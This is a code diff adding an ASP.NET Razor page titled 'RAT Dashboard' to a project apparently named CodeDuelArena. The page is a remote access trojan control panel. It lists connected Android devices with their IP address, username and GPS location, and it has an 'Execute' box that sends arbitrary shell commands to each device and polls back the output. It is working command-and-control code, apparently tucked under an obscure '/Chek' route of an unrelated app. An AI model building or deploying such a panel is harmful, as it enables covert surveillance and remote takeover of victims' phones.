@@ -1,0 +1,95 @@
+@model List<CodeDuelArena.Controllers.DeviceData>
+@{
+    ViewData["Title"] = "RAT Dashboard";
+    Layout = null;
+}
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>RAT Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0a; color: #fff; font-family: monospace; padding: 20px; }
+        h1 { color: #dc3545; margin-bottom: 20px; }
+        .device-card { background: #111; border: 1px solid #333; border-radius: 12px; padding: 16px; margin-bottom: 12px; }
+        .device-card h3 { color: #dc3545; }
+        .device-card p { margin: 4px 0; font-size: 0.85rem; color: #aaa; }
+        .cmd-row { display: flex; gap: 8px; margin-top: 10px; }
+        .cmd-row input { flex: 1; padding: 8px; background: #000; border: 1px solid #333; border-radius: 6px; color: #fff; }
+        .cmd-row button { padding: 8px 16px; background: #dc3545; border: none; border-radius: 6px; color: #fff; cursor: pointer; }
+        .output { background: #000; padding: 10px; border-radius: 6px; margin-top: 8px; max-height: 200px; overflow-y: auto; font-size: 0.8rem; white-space: pre-wrap; }
+        .online { color: #28a745; }
+        .offline { color: #666; }
+        .refresh { padding: 8px 16px; background: #333; border: none; border-radius: 6px; color: #fff; cursor: pointer; margin-bottom: 16px; }
+    </style>
+</head>
+<body>
+    <h1>🖥️ RAT Control Panel</h1>
+    <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
+    <a href="/Chek/Chek/Login" style="color:#dc3545;margin-left:10px;">Logout</a>
+    
+    @if (Model == null || !Model.Any())
+    {
+        <p style="color:#666;">No devices connected. Waiting for heartbeat...</p>
+    }
+    else
+    {
+        @foreach (var d in Model)
+        {
+            <div class="device-card">
+                <h3>📱 @d.Model</h3>
+                <p>🆔 @d.DeviceId | 📶 @d.IpAddress | 🔋 @d.Battery</p>
+                <p>🤖 Android @d.AndroidVersion | 👤 @(string.IsNullOrEmpty(d.Username) ? "Unknown" : d.Username)</p>
+                <p>📍 @(string.IsNullOrEmpty(d.Location) ? "No GPS" : d.Location)</p>
+                <p>🕐 Last seen: @d.LastSeen.ToString("HH:mm:ss")</p>
+                <div class="cmd-row">
+                    <input type="text" id="cmd_@d.DeviceId" placeholder="Shell command...">
+                    <button onclick="sendCommand('@d.DeviceId')">Execute</button>
+                </div>
+                <div class="output" id="out_@d.DeviceId"></div>
+            </div>
+        }
+    }
+    
+    <script>
+        function sendCommand(deviceId) {
+            var cmd = document.getElementById('cmd_' + deviceId).value;
+            if (!cmd) return;
+            
+            var formData = new FormData();
+            formData.append('deviceId', deviceId);
+            formData.append('command', cmd);
+            
+            fetch('/Chek/SendCommand', { method: 'POST', body: formData })
+                .then(r => r.json())
+                .then(data => {
+                    if (data.success) {
+                        pollResult(data.commandId, deviceId);
+                    }
+                });
+        }
+        
+        function pollResult(cmdId, deviceId) {
+            var out = document.getElementById('out_' + deviceId);
+            out.textContent = 'Executing...';
+            
+            var interval = setInterval(() => {
+                fetch('/Chek/GetResult?commandId=' + cmdId)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (data.success) {
+                            out.textContent = data.output;
+                            clearInterval(interval);
+                        } else {
+                            out.textContent = data.output;
+                        }
+                    });
+            }, 2000);
+            
+            setTimeout(() => clearInterval(interval), 30000);
+        }
+    </script>
+</body>
+</html>
